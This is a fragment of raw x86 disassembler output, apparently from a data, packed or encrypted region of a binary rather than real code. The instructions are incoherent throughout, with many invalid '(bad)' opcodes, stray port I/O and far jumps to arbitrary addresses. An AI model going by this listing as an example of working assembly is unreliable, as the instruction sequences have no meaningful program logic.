  41d911:	xlat   BYTE PTR ds:[ebx]
  41d912:	les    eax,FWORD PTR [eax+eiz*2+0x7ba97968]
  41d919:	retf   
  41d91a:	sbb    al,0x84
  41d91c:	ret    0xe11
  41d91f:	xor    DWORD PTR [ebx+0x12],ebx
  41d922:	mov    esi,0x2f77b43d
  41d927:	in     eax,dx
  41d928:	retf   
  41d929:	scas   eax,DWORD PTR es:[edi]
  41d92a:	lods   al,BYTE PTR ds:[esi]
  41d92b:	jg     0x41d95c
  41d92d:	jp     0x41d8ba
  41d92f:	dec    esp
  41d930:	stc    
  41d931:	nop
  41d932:	jae    0x41d8e0
  41d934:	xchg   ebx,eax
  41d935:	lds    esp,FWORD PTR ds:0x206198ba
  41d93b:	fld    TBYTE PTR [ebp+0x4320189c]
  41d941:	cld    
  41d942:	jg     0x41d949
  41d944:	repnz adc al,0xe3
  41d947:	xor    BYTE PTR [ebx-0x41],dl
  41d94a:	scas   eax,DWORD PTR es:[edi]
  41d94b:	out    0xed,eax
  41d94d:	mov    eax,0x794950c0
  41d952:	repnz mov BYTE PTR [edx-0x6b],dl
  41d956:	cdq    
  41d957:	inc    esp
  41d958:	add    BYTE PTR [esi-0x75],dl
  41d95b:	push   0x1c
  41d95d:	dec    eax
  41d95e:	mov    bh,0xbb
  41d960:	xchg   DWORD PTR [esi+0x27],edx
  41d963:	loop   0x41d8e6
  41d965:	inc    BYTE PTR [esp+eax*8]
  41d968:	cmp    DWORD PTR [ebp-0x26dc50aa],edx
  41d96e:	loope  0x41d8f0
  41d970:	inc    edi
  41d971:	test   DWORD PTR [ebx-0x7e19a82f],0xe6a095b6
  41d97b:	shl    BYTE PTR [eax],0x64
  41d97e:	out    dx,eax
  41d97f:	cmp    dh,bl
  41d981:	inc    esp
  41d982:	retf   0x93bc
  41d985:	dec    edi
  41d986:	sub    DWORD PTR [eax],ebx
  41d988:	retf   0xebce
  41d98b:	mov    bl,BYTE PTR [eax]
  41d98d:	mov    bl,0xcd
  41d98f:	mov    bl,0x7c
  41d991:	adc    cl,dh
  41d993:	mov    ebp,0x69731c0c
  41d998:	fsubr  DWORD PTR [ebx-0x1ad53fdf]
  41d99e:	repnz cmc 
  41d9a0:	loope  0x41d956
  41d9a2:	adc    DWORD PTR [edi+edi*4+0x2f3dcf2],0x5b146ac
  41d9ad:	scas   al,BYTE PTR es:[edi]
  41d9ae:	(bad)  
  41d9af:	std    
  41d9b0:	cmp    al,0x24
  41d9b2:	ss cdq 
  41d9b4:	and    BYTE PTR [ebp+0x7a],dh
  41d9b7:	iret   
  41d9b8:	addr16 pop esi
  41d9ba:	lock and ebp,DWORD PTR [esi+0x4b]
  41d9be:	gs mov edi,0x71022e6f
  41d9c4:	loop   0x41da2a
  41d9c6:	xor    al,0xf7
  41d9c8:	(bad)  
  41d9c9:	jmp    0x41d9c8
  41d9cb:	fwait
  41d9cc:	sub    BYTE PTR [esi-0x33962832],ah
  41d9d2:	push   0xffffffd2
  41d9d4:	bound  edx,QWORD PTR [eax+eax*1+0x7a6bc1e3]
  41d9db:	call   0xa2e51f88
  41d9e0:	inc    ebp
  41d9e1:	or     BYTE PTR [ebp+0x61],bh
  41d9e4:	adc    eax,0x78c82bdd
  41d9e9:	xor    DWORD PTR [eax+0x4a],ebx
  41d9ec:	lea    ebx,[esi+0x7bfea93a]
  41d9f2:	xchg   ebp,eax
  41d9f3:	cdq    
  41d9f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9f5:	(bad)  
  41d9f6:	addr16 push edi
  41d9f8:	pop    DWORD PTR [esp+ebp*8]
  41d9fb:	xor    BYTE PTR [ebp+0xb02a298],al
  41da01:	inc    eax
  41da02:	mov    BYTE PTR [ebp+0x24],ah
  41da05:	ret    0xa4a0
  41da08:	dec    edi
  41da09:	mov    edi,0x3c1439cd
  41da0e:	and    eax,0xf0c1300e
  41da13:	push   ebp
  41da14:	lods   al,BYTE PTR ds:[esi]
  41da15:	sub    edi,eax
  41da17:	aad    0x5b
  41da19:	pop    ds
  41da1a:	fisubr DWORD PTR [edi]
  41da1c:	out    0x80,al
  41da1e:	inc    ebx
  41da1f:	mov    DWORD PTR [eax],eax
  41da21:	inc    eax
  41da22:	gs push es
  41da24:	push   esi
  41da25:	jmp    0x41d9aa
  41da27:	iret   
  41da28:	call   0xedb661ca
  41da2d:	and    BYTE PTR [ecx],0x8d
  41da30:	pop    ebp
  41da31:	mov    cl,0x63
  41da33:	sbb    dh,ch
  41da35:	mov    DWORD PTR [ebx+0x2f],ebx
  41da38:	push   ebx
  41da39:	sub    ah,BYTE PTR [eax-0x251bd9ac]
  41da3f:	and    BYTE PTR [edi+0x6a21588e],cl
  41da45:	(bad)  
  41da46:	lods   al,BYTE PTR ds:[esi]
  41da47:	pusha  
  41da48:	(bad)  
  41da49:	ss (bad) 
  41da4b:	sub    DWORD PTR [ecx+0x17a4a783],esi
  41da51:	jb     0x41d9d8
  41da53:	cli    
  41da54:	push   esi
  41da55:	jge    0x41da84
  41da57:	push   ss
  41da58:	mov    edx,DWORD PTR [eax]
  41da5a:	mov    eax,esp
  41da5c:	pop    ecx
  41da5d:	sti    
  41da5e:	jmp    FWORD PTR [ecx+0x6e13e0ce]
  41da64:	dec    esp
  41da65:	aam    0x87
  41da67:	add    bl,BYTE PTR [ebx+edx*8]
  41da6a:	sub    bl,BYTE PTR [ebx]
  41da6c:	push   ebx
  41da6d:	loopne 0x41da1c
  41da6f:	and    DWORD PTR [esi-0x7],edi
  41da72:	mov    dh,BYTE PTR [eax+eax*1+0x4d69526b]
  41da79:	jecxz  0x41da6e
  41da7b:	outs   dx,BYTE PTR ds:[esi]
  41da7c:	scas   eax,DWORD PTR es:[edi]
  41da7d:	ror    edx,0x34
  41da80:	out    0xf4,al
  41da82:	and    al,0x87
  41da84:	mov    eax,DWORD PTR [ebx+0x63]
  41da87:	fbld   TBYTE PTR fs:[esi]
  41da8a:	xor    eax,0x29c3cdba
  41da8f:	or     edx,edx
  41da91:	cli    
  41da92:	xchg   esp,eax
  41da93:	adc    DWORD PTR [ebx-0x37],ecx
  41da96:	aam    0x5
  41da98:	inc    edx
  41da99:	mov    ebx,0x2efee44
  41da9e:	add    al,0x46
  41daa0:	(bad)  
  41daa1:	mov    al,ds:0xbda59ecf
  41daa6:	jmp    0x8417:0x71133101
  41daad:	or     BYTE PTR [ebx],dl
  41daaf:	clc    
  41dab0:	dec    ecx
  41dab1:	mov    BYTE PTR [ebx],0x65
  41dab4:	cdq    
  41dab5:	inc    esp
  41dab6:	loopne 0x41db19
  41dab8:	cmp    esp,ebx
  41daba:	xor    al,0x71
  41dabc:	sub    al,0x96
  41dabe:	pop    ebp
  41dabf:	inc    eax
  41dac0:	call   0x9c0:0xb3ba8ec9
  41dac7:	aaa    
  41dac8:	bound  ebp,QWORD PTR [edx]
  41daca:	jmp    0x4da3:0x57bb6beb
  41dad1:	loope  0x41da92
  41dad3:	in     al,0xc7
  41dad5:	fdivr  QWORD PTR [edx]
  41dad7:	pushf  
  41dad8:	cmp    al,0x68
  41dada:	inc    esp
  41dadb:	(bad)  
  41dadc:	std    
  41dadd:	bound  ebx,QWORD PTR [edx+edi*4-0x7e]
  41dae1:	lds    esi,FWORD PTR [edi+0x79]
  41dae4:	dec    esp
  41dae5:	mov    al,0x32
  41dae7:	(bad)  
  41dae8:	dec    ebx
  41dae9:	cmp    DWORD PTR [ebx+edi*2],esp
  41daec:	and    dl,BYTE PTR [edi+0x78]
  41daef:	enter  0xccac,0xe9
  41daf3:	bound  ebx,QWORD PTR [ebp+esi*2-0x3771245]
  41dafa:	adc    BYTE PTR [ebx],0x8e
  41dafd:	out    dx,al
  41dafe:	fsubp  st(5),st
  41db00:	clc    
  41db01:	ss mov bl,0xff
  41db04:	adc    eax,0x28f4b0d1
  41db09:	inc    ebp
  41db0a:	or     cl,BYTE PTR [esi-0x3c]
  41db0d:	pop    es
  41db0e:	mov    edi,0xa026f499
  41db13:	mov    ah,0xed
  41db15:	add    DWORD PTR [esi-0x32],0x1b4c31ba
  41db1c:	push   0x5bb1496a
  41db21:	add    eax,0xdc9ff218
  41db26:	call   0x1547a66e
  41db2b:	mov    ?,WORD PTR [edx]
  41db2d:	or     eax,0xc4b46e25
  41db32:	sti    
  41db33:	or     BYTE PTR ds:0x384f2f9d,ch
  41db39:	test   DWORD PTR [edi],ebp
  41db3b:	scas   eax,DWORD PTR es:[edi]
  41db3c:	not    BYTE PTR [edi]
  41db3e:	inc    esp
  41db3f:	sar    DWORD PTR [ecx],cl
  41db41:	fimul  WORD PTR [ecx+0x65]
  41db44:	jmp    0xe22d:0xcd780b72
  41db4b:	xchg   ecx,eax
  41db4c:	sahf   
  41db4d:	mov    esp,ss
  41db4f:	ffreep st(2)
  41db51:	leave  
  41db52:	vmwrite esi,DWORD PTR [ebx+0x6d]
  41db56:	xor    edx,DWORD PTR [ebp+0x2f]
  41db59:	stos   BYTE PTR es:[edi],al
  41db5a:	cmp    esi,esp
  41db5c:	mov    DWORD PTR cs:[ebx+ecx*2+0x18],ebx
  41db61:	in     eax,dx
  41db62:	loop   0x41db88
  41db64:	inc    esi
  41db65:	inc    esp
  41db66:	fidiv  DWORD PTR [ecx]
  41db68:	jge    0x41db19
  41db6a:	in     al,dx
  41db6b:	jge    0x41db0b
  41db6d:	and    ax,0x72ce
  41db71:	(bad)  
  41db72:	mov    dl,0xa5
  41db74:	pop    edx
  41db75:	dec    ebx
  41db76:	es xor eax,0x6a1eae8f
  41db7c:	shl    dh,0x5
  41db7f:	nop
  41db80:	cld    
  41db81:	push   ss
  41db82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db83:	push   cs
  41db84:	or     dl,BYTE PTR [esi+0x50]
  41db87:	and    bh,BYTE PTR ds:0x9c0929ba
  41db8d:	jl     0x41db8c
  41db8f:	fcmove st,st(1)
  41db91:	jno    0x41db85
  41db93:	pop    edi
  41db94:	xchg   ecx,eax
  41db95:	in     eax,0x53
  41db97:	pop    edi
  41db98:	inc    ecx
  41db99:	jno    0x41dba4
  41db9b:	loop   0x41dbb3
  41db9d:	jbe    0x41db85
  41db9f:	fdiv   DWORD PTR [esi+ebx*4]
  41dba2:	or     DWORD PTR [edi],0xffffffc3
  41dba5:	pop    esi
  41dba6:	adc    al,0x30
  41dba8:	jmp    0xc5956238
  41dbad:	or     esi,DWORD PTR [edx]
  41dbaf:	inc    edx
  41dbb0:	pusha  
  41dbb1:	test   DWORD PTR [eax+edi*8],edi
  41dbb4:	mov    ds:0xf1453017,eax
  41dbb9:	ins    BYTE PTR es:[edi],dx
  41dbba:	and    al,0xc4
  41dbbc:	mov    ebp,DWORD PTR [ecx+0x77bcac76]
  41dbc2:	push   cs
  41dbc3:	retf   0xf635
  41dbc6:	jne    0x41dbac
  41dbc8:	or     ch,BYTE PTR [eax+0x8d5e139]
  41dbce:	mov    bl,0xf2
  41dbd0:	ins    DWORD PTR es:[edi],dx
  41dbd1:	(bad)  
  41dbd2:	cli    
  41dbd3:	dec    eax
  41dbd4:	leave  
  41dbd5:	add    al,0x4e
  41dbd7:	in     al,0xa9
  41dbd9:	mov    BYTE PTR [edx-0x46a2b0c0],0xe0
  41dbe0:	and    BYTE PTR [esi-0x2f],al
  41dbe3:	je     0x41dc1b
  41dbe5:	mov    edx,DWORD PTR [edx+0x86fa08]
  41dbeb:	add    ecx,esi
  41dbed:	ss in  eax,0x22
  41dbf0:	inc    ecx
  41dbf1:	mov    eax,0x580ce237
  41dbf6:	dec    esi
  41dbf7:	sbb    dl,BYTE PTR [ebp+0x70c5ac29]
  41dbfd:	and    ebx,esi
  41dbff:	and    DWORD PTR ds:0x5a4ebd75,0xffffff80
  41dc06:	in     eax,0x2a
  41dc08:	sub    ebx,ecx
  41dc0a:	jmp    0x519620f1
  41dc0f:	call   0x5f5e:0xb3963375
  41dc16:	lods   eax,DWORD PTR ds:[esi]
  41dc17:	aam    0x10
  41dc19:	pop    edi
  41dc1a:	adc    ah,BYTE PTR [ebx+0x69415e91]
  41dc20:	xor    ebp,edi
  41dc22:	in     al,dx
  41dc23:	jmp    0x62fc:0x35f98aab
  41dc2a:	xor    BYTE PTR [ecx],0xc
  41dc2d:	cwde   
  41dc2e:	lods   eax,DWORD PTR ds:[esi]
  41dc2f:	pop    eax
  41dc30:	xor    DWORD PTR [eax-0x3c355bfc],edx
  41dc36:	out    0x15,al
  41dc38:	jnp    0x41dc31
  41dc3a:	sub    DWORD PTR [esi+0xb89ede5],edi
  41dc40:	adc    al,BYTE PTR [eax]
  41dc42:	lahf   
  41dc43:	push   es
  41dc44:	test   DWORD PTR [ebx+0x35],eax
  41dc47:	adc    dh,ch
  41dc49:	lods   eax,DWORD PTR ds:[esi]
  41dc4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc4b:	cdq    
  41dc4c:	int3   
  41dc4d:	jne    0x41dc3d
  41dc4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc50:	fwait
  41dc51:	jbe    0x41dc27
  41dc53:	xchg   esi,eax
  41dc54:	aad    0xa
  41dc56:	pop    esi
  41dc57:	mov    eax,ds:0xd427679a
  41dc5c:	push   esp
  41dc5d:	jne    0x41dbf8
  41dc5f:	pop    edi
  41dc60:	and    edx,DWORD PTR [eax]
  41dc62:	cmp    cl,bl
  41dc64:	push   0xffffffae
  41dc66:	sar    BYTE PTR [ebp-0x1a0a4b08],cl
  41dc6c:	dec    edx
  41dc6d:	mov    ds:0xdab79446,al
  41dc72:	push   0xf
  41dc74:	mov    gs,WORD PTR [ecx]
  41dc76:	aaa    
  41dc77:	icebp  
  41dc78:	pusha  
  41dc79:	dec    esp
  41dc7a:	xor    ebp,DWORD PTR [ebx+0x321111a4]
  41dc80:	popa   
  41dc81:	test   BYTE PTR [edi-0x556230aa],dh
  41dc87:	fild   QWORD PTR [ecx-0x80]
  41dc8a:	dec    edi
  41dc8b:	mov    esi,0x42030fa6
  41dc90:	add    DWORD PTR [eax+0x56],ebp
  41dc93:	xchg   ebp,eax
  41dc94:	lahf   
  41dc95:	mov    dh,0x78
	...
  41dd13:	add    BYTE PTR [ecx+0x6a],ah
  41dd16:	jmp    0xffd9c832
  41dd1b:	jle    0x41dd23
  41dd1d:	js     0x41dccc
  41dd1f:	aam    0x45
  41dd21:	sbb    eax,0x78a01137
  41dd26:	add    DWORD PTR [eax],eax
  41dd28:	imul   eax,DWORD PTR [edi],0x0
  41dd2b:	add    BYTE PTR [ecx-0x3a],ch
  41dd2e:	xor    ah,BYTE PTR [eax-0x5d9c0b69]
  41dd34:	ins    DWORD PTR es:[edi],dx
  41dd35:	xchg   ecx,eax
  41dd36:	sub    BYTE PTR [edx+0x7],0xa7
  41dd3a:	imul   edx,DWORD PTR [ebp+0x45],0xffffff80
  41dd3e:	mov    al,0x84
  41dd40:	cwde   
  41dd41:	(bad)  
  41dd42:	leave  
  41dd43:	xor    eax,ecx
  41dd45:	hlt    
  41dd46:	xchg   BYTE PTR [esi-0x3b],cl
  41dd49:	dec    edx
  41dd4a:	mov    edx,0x3c283620
  41dd4f:	cmp    eax,0xb2d95ae8
  41dd54:	xchg   ebx,eax
  41dd55:	icebp  
  41dd56:	gs xchg edi,eax
  41dd58:	adc    DWORD PTR [edx+0x67e5b850],eax
  41dd5e:	mov    WORD PTR [esi-0x305e75f1],?
  41dd64:	cmp    al,0xc8
  41dd66:	jmp    0xe372:0x18ab65fc
  41dd6d:	retf   
  41dd6e:	xchg   edi,eax
  41dd6f:	jg     0x41dd61
  41dd71:	push   ecx
  41dd72:	(bad)  
  41dd73:	fucomp st(1)
  41dd75:	dec    edi
  41dd76:	pop    ebx
  41dd77:	int    0x60
  41dd79:	je     0x41dd72
  41dd7b:	mov    edi,0x23f75be1
  41dd80:	pusha  
  41dd81:	mov    al,0x8
  41dd83:	aaa    
  41dd84:	push   eax
  41dd85:	(bad)  
  41dd86:	rcr    BYTE PTR [eax],cl
  41dd88:	mov    al,ds:0xd9b08e18
  41dd8d:	aas    
  41dd8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd8f:	xchg   edi,eax
  41dd90:	xchg   edi,eax
  41dd91:	mov    esi,0x785d084d
  41dd96:	(bad)  
  41dd97:	and    al,0xb9
  41dd99:	jb     0x41ddda
  41dd9b:	fadd   st,st(5)
  41dd9d:	sub    DWORD PTR ss:[ecx-0x4d9dec4d],ecx
  41dda4:	jo     0x41ddd5
  41dda6:	fwait
  41dda7:	popf   
  41dda8:	inc    ebp
  41dda9:	popa   
  41ddaa:	sbb    ch,BYTE PTR [eax-0x5d]
  41ddad:	out    dx,eax
  41ddae:	adc    ch,BYTE PTR [edx]
  41ddb0:	mov    DWORD PTR [esp+edx*1],ebp
  41ddb3:	icebp  
  41ddb4:	sub    DWORD PTR [esi+0x49],esp
  41ddb7:	dec    edx
  41ddb8:	push   esi
  41ddb9:	jno    0x41ddce
  41ddbb:	xlat   BYTE PTR ds:[ebx]
  41ddbc:	xchg   edi,eax
  41ddbd:	jb     0x41de36
  41ddbf:	outs   dx,DWORD PTR ds:[esi]
  41ddc0:	bound  ebp,QWORD PTR [ebp+0x0]
  41ddc3:	adc    al,0x52
  41ddc5:	sub    eax,0xb142ac42
  41ddca:	xchg   edx,eax
  41ddcb:	mov    cl,BYTE PTR [eax-0x469c43a1]
  41ddd1:	cli    
  41ddd2:	sub    edx,esi
  41ddd4:	xlat   BYTE PTR ds:[ebx]
  41ddd5:	adc    eax,DWORD PTR [edi-0x102adf80]
  41dddb:	mov    esi,DWORD PTR [eax-0x79b329b6]
  41dde1:	fs push eax
  41dde3:	icebp  
  41dde4:	inc    ecx
  41dde5:	sbb    eax,0x2dc018e7
  41ddea:	mov    bl,0xe0
  41ddec:	or     cl,bl
  41ddee:	in     al,0xfc
  41ddf0:	(bad)  
  41ddf1:	jbe    0x41de4f
  41ddf3:	xor    eax,0xdefeecb4
  41ddf8:	call   0xf145:0x84898245
  41ddff:	jns    0x41ddf9
  41de01:	ins    DWORD PTR es:[edi],dx
  41de02:	jne    0x41ddfa
  41de04:	stos   BYTE PTR es:[edi],al
  41de05:	leave  
  41de06:	and    esp,DWORD PTR [eax-0x5]
  41de09:	pop    ds
  41de0a:	mov    cl,0xf4
  41de0c:	dec    edx
  41de0d:	iret   
  41de0e:	out    dx,eax
  41de0f:	inc    ebx
  41de10:	inc    ecx
  41de11:	push   0x481f338c
  41de16:	xchg   esi,eax
  41de17:	xchg   edx,eax
  41de18:	call   FWORD PTR [eax]
  41de1a:	and    al,0x62
  41de1c:	(bad)  
  41de1d:	fidiv  WORD PTR [edx]
  41de1f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41de21:	(bad)
  41de25:	dec    ebp
  41de26:	jnp    0x41ddb6
  41de28:	push   esp
  41de29:	rep lods al,BYTE PTR ds:[esi]
  41de2b:	jb     0x41ddba
  41de2d:	push   es
  41de2e:	stc    
  41de2f:	inc    ecx
  41de30:	inc    eax
  41de31:	stos   BYTE PTR es:[edi],al
  41de32:	fsub   DWORD PTR [edi-0x8]
  41de35:	ss fcmovb st,st(3)
  41de38:	outs   dx,DWORD PTR ds:[esi]
  41de39:	push   0xfffffff7
  41de3b:	pop    edx
  41de3c:	sub    DWORD PTR [edi],ebx
  41de3e:	sbb    dh,ah
  41de40:	ficomp WORD PTR [edx]
  41de42:	movups XMMWORD PTR [edx+0x5278a249],xmm4
  41de49:	dec    ebx
  41de4a:	out    dx,eax
  41de4b:	dec    ecx
  41de4c:	shl    DWORD PTR [ebp+0x34],1
  41de4f:	hlt    
  41de50:	sbb    BYTE PTR [ecx+ecx*2-0x2edf5efa],0x7e
  41de58:	into   
  41de59:	xchg   edx,eax
  41de5a:	(bad)  
  41de5b:	sbb    al,al
  41de5d:	adc    al,BYTE PTR [esi-0x51]
  41de60:	mov    ch,0xd
  41de62:	lock mov bl,0xc9
  41de65:	or     ecx,DWORD PTR [ebx-0x68]
  41de68:	push   edi
  41de69:	xchg   ebp,eax
  41de6a:	(bad)  
  41de6b:	cmc    
  41de6c:	cmc    
  41de6d:	jmp    0x996a:0x1c7553e8
  41de74:	dec    ebp
  41de75:	push   ebp
  41de76:	sbb    esp,ebx
  41de78:	or     eax,0x1fc10116
  41de7d:	push   ds
  41de7e:	sbb    al,0xff
  41de80:	cmp    edi,DWORD PTR [ecx]
  41de82:	test   eax,0xfdad09be
  41de87:	retf   0x9798
  41de8a:	mov    cl,0x5
  41de8c:	xor    DWORD PTR [edx],esp
  41de8e:	sbb    BYTE PTR [edx+0x6c159a3c],dh
  41de94:	xor    DWORD PTR [ebx+ebp*2-0x39c3dd31],ebp
  41de9b:	add    bh,cl
  41de9d:	jge    0x41decc
  41de9f:	into   
  41dea0:	mov    DWORD PTR [edi],edx
  41dea2:	xchg   ebx,eax
  41dea3:	sbb    DWORD PTR [edi-0x38c691ec],esp
  41dea9:	mov    ds:0x301efab1,eax
  41deae:	popf   
  41deaf:	je     0x41df2b
  41deb1:	and    al,0x24
  41deb3:	sbb    al,0x4d
  41deb5:	xchg   ebp,eax
  41deb6:	mov    esi,0x98621623
  41debb:	cmp    al,0x52
  41debd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41debe:	mov    esp,0xe31e7d6c
  41dec3:	xor    eax,0x1f887ea4
  41dec8:	std    
  41dec9:	bnd jo 0x41def5
  41decc:	pop    esi
  41decd:	add    BYTE PTR [ebp+0xcf618de],al
  41ded3:	push   eax
  41ded4:	pushf  
  41ded5:	popf   
  41ded6:	jl     0x41defe
  41ded8:	retf   
  41ded9:	inc    ebp
  41deda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dedb:	xor    BYTE PTR [ecx],bh
  41dedd:	stos   DWORD PTR es:[edi],eax
  41dede:	loope  0x41df1b
  41dee0:	test   BYTE PTR [edi+0x34ccea15],bl
  41dee6:	push   0xfffffff2
  41dee8:	cld    
  41dee9:	dec    ebp
  41deea:	push   ebp
  41deeb:	icebp  
  41deec:	mov    ch,0x6b
  41deee:	aam    0x8c
  41def0:	xchg   edi,eax
  41def1:	jo     0x41df23
  41def3:	jae    0x41df49
  41def5:	int    0xfa
  41def7:	inc    edx
  41def8:	jbe    0x41df54
  41defa:	rol    DWORD PTR [ebx-0x2c],0x5b
  41defe:	dec    edx
  41deff:	in     eax,0xf8
  41df01:	mov    al,ds:0xf57b37c4
  41df06:	fist   WORD PTR [ebx+0x24613b5f]
  41df0c:	(bad)  
  41df0d:	stos   BYTE PTR es:[edi],al
  41df0e:	dec    ebx
  41df0f:	aaa    
  41df10:	pop    esi
  41df11:	ror    DWORD PTR [ebx-0x1b],1
  41df14:	push   eax
  41df15:	xor    dh,al
  41df17:	dec    esp
  41df18:	jg     0x41deed
  41df1a:	bound  eax,QWORD PTR [edx+0x4ec301c0]
  41df20:	xchg   esp,eax
  41df21:	pusha  
  41df22:	sub    eax,ecx
  41df24:	and    ebp,ebx
  41df26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df27:	jecxz  0x41dfa1
  41df29:	arpl   WORD PTR ds:0x9a2077be,ax
  41df2f:	icebp  
  41df30:	mov    eax,0xc39c70e8
  41df35:	fnstenv [esi+eiz*8-0x9c2abe6]
  41df3c:	ds inc edi
  41df3e:	dec    edx
  41df3f:	cwde   
  41df40:	shl    DWORD PTR [edx-0x63],0xbd
  41df44:	shl    BYTE PTR [edx+ecx*8+0x7a],0x2b
  41df49:	pop    ebp
  41df4a:	pop    esi
  41df4b:	dec    DWORD PTR [ebx+0x1172d441]
  41df51:	and    DWORD PTR [eax+ecx*8-0x267a4ebc],edx
  41df58:	mov    ebp,0xf0f19e60
  41df5d:	into   
  41df5e:	test   al,0xc4
  41df60:	xor    ch,BYTE PTR [ebx]
  41df62:	xor    DWORD PTR [edx*2+0xdc07b84],0x0
  41df6a:	dec    eax
  41df6b:	stos   DWORD PTR es:[edi],eax
  41df6c:	or     DWORD PTR [edi+0x6b],0xa28991a4
  41df73:	xchg   esp,eax
  41df74:	data16 std 
  41df76:	jno    0x41df67
  41df78:	in     eax,dx
  41df79:	sub    bl,dl
  41df7b:	mov    ah,0x6b
  41df7d:	(bad)  
  41df7e:	jmp    0x560dab46
  41df83:	and    DWORD PTR [ecx],ebx
  41df85:	cmc    
  41df86:	cmp    ecx,DWORD PTR [ebx-0xa]
  41df89:	pop    esi
  41df8a:	mov    dh,0xd2
  41df8c:	cs pop edx
  41df8e:	push   esi
  41df8f:	and    eax,0xed65c157
  41df94:	fwait
  41df95:	mov    bl,0x70
  41df97:	call   0xcfd8d9ba
  41df9c:	inc    ebx
  41df9d:	jnp    0x41dff2
  41df9f:	in     al,dx
  41dfa0:	cmp    DWORD PTR [eax],edx
  41dfa2:	add    ecx,DWORD PTR [esi-0x1e]
  41dfa5:	sbb    ch,ah
  41dfa7:	lea    ebp,[edi+edx*4+0x3d]
  41dfab:	mov    dh,0xf5
  41dfad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfae:	enter  0x9556,0x9f
  41dfb2:	ss pusha 
  41dfb4:	jge    0x41dfaf
  41dfb6:	pop    es
  41dfb7:	adc    esp,0x7e
  41dfba:	and    ecx,DWORD PTR [eax]
  41dfbc:	xchg   edi,eax
  41dfbd:	add    BYTE PTR [edi-0x56],bl
  41dfc0:	lock sbb ecx,DWORD PTR [ebp-0x2a]
  41dfc4:	jmp    0x683c2708
  41dfc9:	repz or eax,0x4b3e5b3e
  41dfcf:	jbe    0x41dfb9
  41dfd1:	sbb    ebp,DWORD PTR [ebx]
  41dfd3:	rol    DWORD PTR [ebx],cl
  41dfd5:	mov    esp,0x132b25b1
  41dfda:	fisttp QWORD PTR [edx-0x72]
  41dfdd:	xor    ecx,edi
  41dfdf:	popf   
  41dfe0:	or     cl,ah
  41dfe2:	fs inc ebp
  41dfe4:	jne    0x41df67
  41dfe6:	outs   dx,BYTE PTR ss:[esi]
  41dfe8:	ror    BYTE PTR [esi+eax*2+0x60],cl
  41dfec:	mov    ebp,0x914028ed
  41dff1:	aad    0x62
  41dff3:	std    
  41dff4:	jmp    0xa8ec:0x1c157d62
  41dffb:	or     al,BYTE PTR [edx+0x632d4cca]
  41e001:	or     bl,BYTE PTR [edi]
  41e003:	add    al,BYTE PTR [ecx+0x7cddd22]
  41e009:	push   0xa1eb8d2e
  41e00e:	and    ecx,DWORD PTR [edi-0x48]
  41e011:	sbb    eax,0x8a9ab1d4
  41e016:	lea    ebp,ds:0xe78810aa
  41e01c:	push   es
  41e01d:	cli    
  41e01e:	mov    esp,0x9537891b
  41e023:	cld    
  41e024:	pop    ss
  41e025:	push   ebx
  41e026:	cmp    bh,BYTE PTR [ebp-0x25]
  41e029:	push   esi
  41e02a:	shl    DWORD PTR [ebx+0x10],1
  41e02d:	and    eax,0x9b6c9406
  41e032:	mov    ch,0xe1
  41e034:	mov    BYTE PTR [eax],cl
  41e036:	jmp    0x104c:0x4b6a0a1d
  41e03d:	ja     0x41e024
  41e03f:	dec    eax
  41e040:	loopne 0x41e053
  41e042:	pop    edx
  41e043:	je     0x41e0b9
  41e045:	and    BYTE PTR [edx],0xd9
  41e048:	jo     0x41e032
  41e04a:	imul   ebx,DWORD PTR [edi-0xb],0x1d
  41e04e:	aaa    
  41e04f:	jg     0x41e063
  41e051:	cmp    dl,BYTE PTR [edx-0x44]
  41e054:	stc    
  41e055:	pusha  
  41e056:	add    eax,ebx
  41e058:	push   0x4ffadda7
  41e05d:	shld   DWORD PTR [ebp+0x6dcf0628],ebx,0xc6
  41e065:	sub    eax,0x4283e671
  41e06a:	push   0xd50b4810
  41e06f:	cmp    eax,0xb35c52dc
  41e074:	in     al,dx
  41e075:	ja     0x41e08b
  41e077:	push   edi
  41e078:	dec    eax
  41e079:	mov    WORD PTR [ebx+0x41c24758],?
  41e07f:	sub    cl,ah
  41e081:	iret   
  41e082:	inc    edx
  41e083:	sub    esp,0xffffffc4
  41e086:	dec    ebp
  41e087:	sbb    esi,DWORD PTR [ebp-0x2ca43e31]
  41e08d:	mov    esi,0xce4f122a
  41e092:	xor    DWORD PTR [edx],0x2b
  41e095:	jo     0x41e033
  41e097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e098:	aas    
  41e099:	imul   DWORD PTR [ebx]
  41e09b:	loop   0x41e0ff
  41e09d:	fbld   TBYTE PTR [esi+0x5ad46169]
  41e0a3:	add    eax,0xcaf8661f
  41e0a8:	inc    eax
  41e0a9:	je     0x41e091
  41e0ab:	fisub  DWORD PTR [esi-0x456c4ba9]
  41e0b1:	loope  0x41e113
  41e0b3:	int    0xbf
  41e0b5:	pop    edx
  41e0b6:	mov    cs,WORD PTR [eax+0x618e67bd]
  41e0bc:	jne    0x41e13c
  41e0be:	cmp    BYTE PTR [ecx-0x4c],ah
  41e0c1:	cwde   
  41e0c2:	test   BYTE PTR [ebx+0x1d],ah
  41e0c5:	aad    0x36
  41e0c7:	ret    
  41e0c8:	ds inc ebp
  41e0ca:	mov    WORD PTR [edx+0x4a],es
  41e0cd:	or     esi,DWORD PTR ds:0x1e5c50da
  41e0d3:	sbb    eax,eax
  41e0d5:	mov    ebx,0x6ddf991
  41e0da:	das    
  41e0db:	scas   eax,DWORD PTR es:[edi]
  41e0dc:	and    ch,ch
  41e0de:	mov    ebp,0x506f4f9b
  41e0e3:	xor    esp,DWORD PTR [ecx]
  41e0e5:	mov    bh,0xa4
  41e0e7:	ins    BYTE PTR es:[edi],dx
  41e0e8:	pop    edx
  41e0e9:	jge    0x41e071
  41e0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0ec:	pop    ecx
  41e0ed:	cmp    al,0x56
